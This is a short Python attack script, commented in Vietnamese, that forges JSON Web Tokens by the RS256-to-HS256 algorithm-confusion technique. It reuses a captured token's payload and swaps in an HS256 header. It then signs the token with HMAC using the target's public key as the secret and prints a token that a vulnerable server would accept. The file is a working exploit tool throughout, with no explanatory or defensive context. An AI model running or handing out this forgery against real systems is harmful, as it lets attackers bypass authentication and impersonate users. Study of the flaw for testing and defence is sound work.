#!/usr/bin/env python3

"""
Convert JWT tokens from RS256 to HS256
"""

import sys
import re
import hmac
import hashlib
import base64

def main(argc, argv):
    if argc != 3:
        print("Usage: {} {{RS256 JWT token}} {{Public key file}}".format(argv[0]))
        sys.exit(1)

    print('\n')
    JWT_token = argv[1]
    pubkey_file = argv[2]

    # Lấy payload từ JWT
    m = re.search(r'.*\.(.*)\..*', JWT_token)
    if not m:
        print("Invalid JWT token format")
        sys.exit(1)
    
    JWT_payload = m.group(1)

    data = JWT_header + '.' + JWT_payload

    # Đọc public key và encode thành bytes
    with open(pubkey_file, 'r') as f:
        pkey = f.read().strip().encode('utf-8')

    # Tạo HMAC
    h = hmac.new(pkey, data.encode('utf-8'), DIGEST).hexdigest()

    print('[+] data:', data)
    print('[+] HMAC:', h)

    # Encode signature sang base64 URL safe
    sign = base64.urlsafe_b64encode(bytes.fromhex(h)).decode('utf-8').rstrip('=')
    print('[+] signature:', sign)

    print('-----------')
    print('[+] new JWT token:', data + '.' + sign)


DIGEST = hashlib.sha256
JWT_header = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9'  # {"typ":"JWT", "alg":"HS256"}

if __name__ == "__main__":
    main(len(sys.argv), sys.argv)
